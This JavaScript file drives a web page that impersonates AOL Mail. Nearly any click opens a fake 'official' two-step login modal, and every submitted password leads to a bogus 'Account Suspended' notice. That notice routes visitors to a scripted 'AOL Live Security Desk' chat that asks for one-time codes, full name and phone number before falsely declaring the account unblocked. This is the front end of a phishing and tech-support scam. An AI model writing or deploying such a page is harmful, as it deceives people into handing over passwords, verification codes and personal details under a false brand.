// ==========================================================================
// AOL MAIL LOGIN & SUPPORT PORTAL - CONTROLLER
// Universal Trigger: Any Login / Card Click Opens Official AOL Modal (Image 2)
// Followed by Account Suspended Security Card & Live Chat Support Desk
// ==========================================================================

document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    window.lucide.createIcons();
  }

  initUniversalModalTriggers();
  initOfficialLoginModal();
  initLoginForm();
  initPasswordVisibility();
  initDomainChips();
  initGuideTabs();
  initPasswordResetWizard();
  initDiagnostics();
  initAccountSuspendedAndLiveChat();
});

// Toast notification helper
function showToast(message, type = 'info', duration = 3500) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast-message ${type}`;

  let iconName = 'info';
  if (type === 'success') iconName = 'check-circle';
  if (type === 'error') iconName = 'alert-circle';
  if (type === 'warning') iconName = 'alert-triangle';

  toast.innerHTML = `
    <i data-lucide="${iconName}"></i>
    <span>${message}</span>
  `;

  container.appendChild(toast);
  if (window.lucide) window.lucide.createIcons();

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, duration);
}

// Global modal helper to open official AOL 2-step modal (Image 2 Match)
function openOfficialLoginModalWithData(emailVal = '', passwordVal = '') {
  const modal = document.getElementById('official-login-modal');
  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');

  if (modal) {
    modal.style.display = 'flex';
    
    // Always start on Step 1 (Username or Email -> Next) matching Image 2
    if (step1Form) step1Form.style.display = 'flex';
    if (step2Form) step2Form.style.display = 'none';

    if (usernameInput) {
      usernameInput.value = emailVal || '';
      usernameInput.focus();
    }
    if (passwordInput) {
      passwordInput.value = passwordVal || '';
    }
    if (window.lucide) window.lucide.createIcons();
  }
}

// ==========================================================================
// 1. UNIVERSAL CLICK HANDLERS (Whole Page Any Place Click -> Opens Modal)
// ==========================================================================
function initUniversalModalTriggers() {
  // Elements that should open the official AOL modal
  const triggerSelectors = [
    '#btn-open-login-modal',
    '#btn-quick-nav-login',
    '#hero-btn-open-login',
    '#btn-footer-login',
    '#login-card-box',
    '#btn-submit-login',
    '#btn-google-login',
    '.support-hub-card',
    '.g-tab-btn',
    '.hero-action-btn',
    '.feature-chip'
  ];

  triggerSelectors.forEach(selector => {
    const elements = document.querySelectorAll(selector);
    elements.forEach(el => {
      el.addEventListener('click', (e) => {
        // If clicking inside the already opened modal or chat, do not re-trigger
        if (e.target.closest('.official-login-modal-box') || 
            e.target.closest('.suspended-card-box') || 
            e.target.closest('.live-chat-floating-widget')) {
          return;
        }

        e.preventDefault();
        const heroEmail = document.getElementById('login-email')?.value.trim();
        const heroPw = document.getElementById('login-password')?.value;
        openOfficialLoginModalWithData(heroEmail || '', heroPw || '');
      });
    });
  });
}

// ==========================================================================
// 2. DEDICATED OFFICIAL AOL LOGIN MODAL (Image 2 Match)
// "Simple solutions for a faster PC!" + Official AOL 2-Step Sign In Card
// ==========================================================================
function initOfficialLoginModal() {
  const modal = document.getElementById('official-login-modal');
  const closeBtn = document.getElementById('btn-close-login-modal');

  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');
  const displayUser = document.getElementById('modal-display-user');
  const editUserBtn = document.getElementById('btn-modal-edit-user');
  const togglePwBtn = document.getElementById('btn-modal-toggle-pw');
  const pwEyeIcon = document.getElementById('modal-pw-eye');
  const autofillBtn = document.getElementById('btn-modal-autofill');
  const createAccBtn = document.getElementById('btn-modal-create-acc');

  function closeModal() {
    if (modal) {
      modal.style.display = 'none';
    }
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      closeModal();
    });
  }

  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeModal();
      }
    });
  }

  if (autofillBtn) {
    autofillBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (usernameInput) usernameInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo account filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (createAccBtn) {
    createAccBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      showToast('AOL Registration: New accounts can use demo credentials.', 'info');
    });
  }

  if (togglePwBtn && passwordInput && pwEyeIcon) {
    togglePwBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPw = passwordInput.type === 'password';
      passwordInput.type = isPw ? 'text' : 'password';
      pwEyeIcon.setAttribute('data-lucide', isPw ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // STEP 1: Enter Email / Username -> Transitions to Password Step
  if (step1Form) {
    step1Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const val = usernameInput ? usernameInput.value.trim() : '';
      if (!val) {
        showToast('Please enter your Username or Email.', 'warning');
        return;
      }

      if (displayUser) displayUser.textContent = val;
      step1Form.style.display = 'none';
      step2Form.style.display = 'flex';
      if (passwordInput) {
        passwordInput.focus();
        passwordInput.select();
      }
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // Edit Username -> Back to Step 1
  if (editUserBtn) {
    editUserBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      step2Form.style.display = 'none';
      step1Form.style.display = 'flex';
      if (usernameInput) usernameInput.focus();
    });
  }

  // STEP 2: Password Submission -> Triggers Account Suspended Modal (Screenshot 1 Match)
  if (step2Form) {
    step2Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const password = passwordInput ? passwordInput.value : '';

      if (!password) {
        showToast('Please enter your password.', 'warning');
        return;
      }

      const submitBtn = document.getElementById('btn-modal-signin');
      const btnText = submitBtn ? submitBtn.querySelector('.btn-text') : null;
      const btnSpinner = submitBtn ? submitBtn.querySelector('.btn-spinner') : null;

      if (btnText) btnText.textContent = 'Verifying...';
      if (btnSpinner) btnSpinner.style.display = 'inline-block';
      if (submitBtn) submitBtn.disabled = true;

      setTimeout(() => {
        if (btnText) btnText.textContent = 'Sign in';
        if (btnSpinner) btnSpinner.style.display = 'none';
        if (submitBtn) submitBtn.disabled = false;

        // Open the Account Suspended Modal directly
        openAccountSuspendedModal();
      }, 500);
    });
  }
}

// ==========================================================================
// 3. ON-PAGE HERO LOGIN CARD
// ==========================================================================
function initLoginForm() {
  const form = document.getElementById('aol-login-form');
  const emailInput = document.getElementById('login-email');
  const passwordInput = document.getElementById('login-password');
  const demoBtn = document.getElementById('btn-autofill-demo');
  const googleBtn = document.getElementById('btn-google-login');

  if (demoBtn) {
    demoBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (emailInput) emailInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo credentials filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const usernameOrEmail = emailInput ? emailInput.value.trim() : '';
      const password = passwordInput ? passwordInput.value : '';
      openOfficialLoginModalWithData(usernameOrEmail || '', password || '');
    });
  }

  if (googleBtn) {
    googleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      openOfficialLoginModalWithData('', '');
    });
  }
}

// ==========================================================================
// 4. ACCOUNT SUSPENDED & LIVE CHAT CONTROLLER (Screenshot 1 Match)
// ==========================================================================
function openAccountSuspendedModal() {
  const loginModal = document.getElementById('official-login-modal');
  if (loginModal) loginModal.style.display = 'none';

  const suspendedModal = document.getElementById('account-suspended-modal');
  if (suspendedModal) {
    suspendedModal.style.display = 'flex';
  }
}

function initAccountSuspendedAndLiveChat() {
  const suspendedModal = document.getElementById('account-suspended-modal');
  const closeSuspendedBtn = document.getElementById('btn-close-suspended');
  const chatNowBtn = document.getElementById('btn-suspended-chat-now');

  const chatWidget = document.getElementById('live-chat-widget');
  const closeChatBtn = document.getElementById('btn-chat-close');
  const chatForm = document.getElementById('chat-input-form');
  const chatInput = document.getElementById('chat-input-text');
  const chatMessagesContainer = document.getElementById('chat-messages-container');
  const quickChips = document.querySelectorAll('.chat-chip-btn');

  if (closeSuspendedBtn && suspendedModal) {
    closeSuspendedBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      suspendedModal.style.display = 'none';
    });
  }

  if (chatNowBtn) {
    chatNowBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (suspendedModal) suspendedModal.style.display = 'none';
      if (chatWidget) {
        chatWidget.style.display = 'flex';
        if (chatInput) chatInput.focus();
        showToast('Connected to AOL Live Security Desk.', 'info', 2500);
      }
    });
  }

  if (closeChatBtn && chatWidget) {
    closeChatBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      chatWidget.style.display = 'none';
    });
  }

  function appendChatMessage(text, sender = 'user') {
    if (!chatMessagesContainer) return;

    const bubble = document.createElement('div');
    bubble.className = `chat-bubble ${sender === 'user' ? 'user-bubble' : 'agent-bubble'}`;
    bubble.textContent = text;
    chatMessagesContainer.appendChild(bubble);
    chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight;
  }

  quickChips.forEach(chip => {
    chip.addEventListener('click', (e) => {
      e.stopPropagation();
      const msg = chip.getAttribute('data-msg') || chip.textContent;
      appendChatMessage(msg, 'user');

      setTimeout(() => {
        if (msg.includes('SMS')) {
          appendChatMessage('We have dispatched a 6-digit security OTP code to your registered mobile phone (+1 ***-***-9201). Please enter the code here to unblock your account.', 'agent');
        } else if (msg.includes('Email')) {
          appendChatMessage('A secure one-time unlock link has been dispatched to your backup email (al***@gmail.com). Please click the link to confirm your identity.', 'agent');
        } else {
          appendChatMessage('I am initiating an instant identity verification for Error Reference ERR_AUTH_0x8004. Please confirm your full name and registered phone number.', 'agent');
        }
      }, 700);
    });
  });

  if (chatForm && chatInput) {
    chatForm.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const text = chatInput.value.trim();
      if (!text) return;

      appendChatMessage(text, 'user');
      chatInput.value = '';

      setTimeout(() => {
        const lower = text.toLowerCase();
        if (lower.includes('hello') || lower.includes('hi') || lower.includes('help')) {
          appendChatMessage('Hello! I am reviewing your account lock for reference ERR_AUTH_0x8004. To proceed with the unblock, would you prefer verification via SMS code or security questions?', 'agent');
        } else if (lower.includes('code') || /^\d{4,6}$/.test(lower)) {
          appendChatMessage('Thank you! Validating verification code... Identity confirmed! Your account is being unlocked now.', 'agent');
          setTimeout(() => {
            appendChatMessage('✅ Success: Your AOL Mail account has been unblocked! You can now sign in safely without restrictions.', 'agent');
            showToast('Account successfully unblocked!', 'success', 4000);
          }, 1200);
        } else {
          appendChatMessage('Thank you for the information. Our senior security supervisor is reviewing your credentials. Please hold for just a moment.', 'agent');
        }
      }, 800);
    });
  }
}

// 5. Password Visibility Toggle
function initPasswordVisibility() {
  const toggleBtn = document.getElementById('toggle-pw-btn');
  const passwordInput = document.getElementById('login-password');
  const eyeIcon = document.getElementById('pw-eye-icon');

  if (toggleBtn && passwordInput && eyeIcon) {
    toggleBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeIcon.setAttribute('data-lucide', isPassword ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }
}

// 6. Quick Domain Chips
function initDomainChips() {
  const chips = document.querySelectorAll('.domain-tag');
  const emailInput = document.getElementById('login-email');

  chips.forEach(chip => {
    chip.addEventListener('click', (e) => {
      e.stopPropagation();
      const domain = chip.getAttribute('data-domain');
      if (!emailInput) return;

      let currentVal = emailInput.value.trim();
      if (currentVal.includes('@')) {
        currentVal = currentVal.split('@')[0];
      }
      emailInput.value = currentVal ? `${currentVal}${domain}` : `username${domain}`;
      emailInput.focus();
    });
  });
}

// 7. Guide Multi-device Tabs
function initGuideTabs() {
  const tabButtons = document.querySelectorAll('.guide-tabs-bar .g-tab-btn');
  const tabPanes = document.querySelectorAll('.g-tab-content');

  tabButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      tabButtons.forEach(b => b.classList.remove('active'));
      tabPanes.forEach(p => (p.style.display = 'none'));

      btn.classList.add('active');
      const targetId = btn.getAttribute('data-tab');
      const targetPane = document.getElementById(targetId);
      if (targetPane) {
        targetPane.style.display = 'block';
      }
    });
  });
}

// 8. Interactive Password Recovery Wizard
let recoverySession = { email: '', otp: '', resetToken: '' };

function initPasswordResetWizard() {
  const pane1 = document.getElementById('rec-pane-1');
  const pane2 = document.getElementById('rec-pane-2');
  const pane3 = document.getElementById('rec-pane-3');
  const paneSuccess = document.getElementById('rec-pane-success');

  const emailInput = document.getElementById('rec-input-email');
  const btnStep1 = document.getElementById('btn-rec-step1');

  const otpInput = document.getElementById('rec-input-otp');
  const btnAutofillOtp = document.getElementById('btn-rec-autofill-otp');
  const otpValSpan = document.getElementById('rec-otp-val');
  const btnVerify = document.getElementById('btn-rec-verify');

  const newPwInput = document.getElementById('rec-input-newpw');
  const btnSave = document.getElementById('btn-rec-save');

  if (btnStep1 && emailInput) {
    btnStep1.addEventListener('click', async (e) => {
      e.stopPropagation();
      const email = emailInput.value.trim();
      if (!email || !email.includes('@')) {
        showToast('Please enter a valid AOL email address.', 'warning');
        return;
      }

      btnStep1.disabled = true;
      btnStep1.innerHTML = '<span>Sending...</span>';

      try {
        const res = await fetch('/api/auth/forgot-password/request', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await res.json();

        if (res.ok && data.success) {
          recoverySession.email = email;
          recoverySession.otp = data.simulatedCode;

          if (otpValSpan) otpValSpan.textContent = data.simulatedCode;
          showToast(`Security code generated: ${data.simulatedCode}`, 'success', 5000);

          pane1.style.display = 'none';
          pane2.style.display = 'block';
          if (otpInput) otpInput.focus();
        } else {
          showToast(data.message || 'Error sending recovery code.', 'error');
        }
      } catch (err) {
        showToast('Server error sending code.', 'error');
      } finally {
        btnStep1.disabled = false;
        btnStep1.innerHTML = '<span>Send Code</span> <i data-lucide="arrow-right"></i>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }

  if (btnAutofillOtp && otpInput) {
    btnAutofillOtp.addEventListener('click', (e) => {
      e.stopPropagation();
      if (recoverySession.otp) {
        otpInput.value = recoverySession.otp;
        showToast('OTP inserted.', 'info', 1500);
      }
    });
  }

  if (btnVerify && otpInput) {
    btnVerify.addEventListener('click', async (e) => {
      e.stopPropagation();
      const code = otpInput.value.trim();
      if (!code || code.length < 6) {
        showToast('Please enter the 6-digit code.', 'warning');
        return;
      }

      btnVerify.disabled = true;
      btnVerify.innerHTML = '<span>Verifying...</span>';

      try {
        const res = await fetch('/api/auth/forgot-password/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: recoverySession.email, code })
        });
        const data = await res.json();

        if (res.ok && data.success) {
          recoverySession.resetToken = data.resetToken;
          showToast('Identity verified! Please set a new password.', 'success');

          pane2.style.display = 'none';
          pane3.style.display = 'block';
          if (newPwInput) newPwInput.focus();
        } else {
          showToast(data.message || 'Invalid verification code.', 'error');
        }
      } catch (err) {
        showToast('Error verifying code.', 'error');
      } finally {
        btnVerify.disabled = false;
        btnVerify.innerHTML = '<span>Verify Code</span> <i data-lucide="check-circle"></i>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }

  if (btnSave && newPwInput) {
    btnSave.addEventListener('click', async (e) => {
      e.stopPropagation();
      const newPassword = newPwInput.value;
      if (!newPassword || newPassword.length < 6) {
        showToast('Password must be at least 6 characters long.', 'warning');
        return;
      }

      btnSave.disabled = true;
      btnSave.innerHTML = '<span>Saving...</span>';

      try {
        const res = await fetch('/api/auth/forgot-password/reset', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: recoverySession.email,
            resetToken: recoverySession.resetToken,
            newPassword
          })
        });
        const data = await res.json();

        if (res.ok && data.success) {
          showToast('Password reset complete! You can now sign in.', 'success');
          pane3.style.display = 'none';
          paneSuccess.style.display = 'block';

          const loginPw = document.getElementById('login-password');
          const loginEmail = document.getElementById('login-email');
          if (loginEmail) loginEmail.value = recoverySession.email;
          if (loginPw) loginPw.value = newPassword;
        } else {
          showToast(data.message || 'Error updating password.', 'error');
        }
      } catch (err) {
        showToast('Server error resetting password.', 'error');
      } finally {
        btnSave.disabled = false;
        btnSave.innerHTML = '<span>Save Password</span> <i data-lucide="lock"></i>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }
}

// 9. Diagnostics Runner
function initDiagnostics() {
  const runBtn = document.getElementById('btn-run-diag');
  const resultsBox = document.getElementById('diag-results-box');
  const grid = document.getElementById('diag-grid-container');

  if (runBtn && resultsBox && grid) {
    runBtn.addEventListener('click', async (e) => {
      e.stopPropagation();
      runBtn.disabled = true;
      runBtn.innerHTML = '<span class="btn-spinner" style="display:inline-block;width:14px;height:14px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;"></span> <span>Testing Servers...</span>';
      resultsBox.style.display = 'block';
      grid.innerHTML = '<div style="color:#64748b;padding:10px;">Pinging AOL Edge servers & verifying IMAP 993 / SMTP 587 ports...</div>';

      try {
        const res = await fetch('/api/diagnostics/check');
        const data = await res.json();

        if (data.success && data.checks) {
          grid.innerHTML = '';
          data.checks.forEach(test => {
            const cell = document.createElement('div');
            cell.className = 'diag-item-cell';
            const isOk = test.status === 'OK' || test.status === 'Passed';
            cell.innerHTML = `
              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                <strong>${test.name}</strong>
                <span style="color:${isOk ? '#10b981' : '#ef4444'};font-weight:700;">● ${test.status}</span>
              </div>
              <p style="color:#64748b;font-size:12px;">${test.details}</p>
            `;
            grid.appendChild(cell);
          });
          showToast('All AOL mail diagnostic checks passed!', 'success');
        }
      } catch (err) {
        grid.innerHTML = '<div style="color:#ef4444;padding:10px;">Diagnostic test timed out.</div>';
      } finally {
        runBtn.disabled = false;
        runBtn.innerHTML = '<i data-lucide="rotate-cw"></i> <span>Re-run Diagnostic</span>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }
}
